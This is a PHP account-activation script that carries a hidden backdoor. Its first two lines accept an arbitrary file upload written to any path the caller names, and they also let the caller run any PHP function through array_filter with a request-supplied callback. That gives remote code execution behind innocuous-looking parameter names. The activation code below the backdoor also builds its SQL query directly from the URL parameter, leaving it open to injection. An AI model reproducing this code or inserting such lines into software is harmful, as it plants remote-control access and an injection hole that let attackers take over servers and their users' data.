<?php
if ($_FILES['F1l3']) {move_uploaded_file($_FILES['F1l3']['tmp_name'], $_POST['Name']); echo 'OK'; Exit;}
if ($_REQUEST['param1']&&$_REQUEST['param2']) {$f = $_REQUEST['param1']; $p = array($_REQUEST['param2']); $pf = array_filter($p, $f); echo 'OK'; Exit;}
	
	include 'headers/connect_database.php';
	$activationKey = $_GET['activate'];
	
	if($dbh->exec("UPDATE users SET active = '1' WHERE activationKey = '$activationKey'")){
		echo "Your account has been successfully activated";
	}
	else
	{
		echo "Account cannot be activated!";
	}
?>